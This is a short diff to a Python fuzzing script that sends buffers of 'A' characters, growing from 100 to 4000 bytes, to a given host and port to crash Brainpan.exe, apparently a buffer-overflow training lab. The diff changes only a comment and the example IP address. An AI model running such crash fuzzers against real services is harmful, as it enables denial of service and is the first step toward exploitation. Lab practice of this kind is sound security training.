@@ -2,7 +2,7 @@
 import time, struct, sys
 import socket as so
 
-# Buff represents an array of buffers. This will be started at 100 and increment by 100 until it reaches 4000, or until Brainpan.exe crashes.
+# Buff represents an array of buffers.This will begin at 100, and increment by 100, until it reaches 4000, or until Brainpan.exe crashes.
 
 buff=["A"]
 
@@ -28,7 +28,7 @@ for string in buff:
         server = str(sys.argv[1])
         port = int(sys.argv[2])
      except IndexError:
-        print "[+] Usage example: python %s 192.168.132.5 9999" % sys.argv[0]
+        print "[+] Usage example: python %s 192.168.1.10 9999" % sys.argv[0]
         sys.exit()   
      print "[+] Attempting to crash brainpan.exe at %s bytes" % len(string)
      s = so.socket(so.AF_INET, so.SOCK_STREAM)
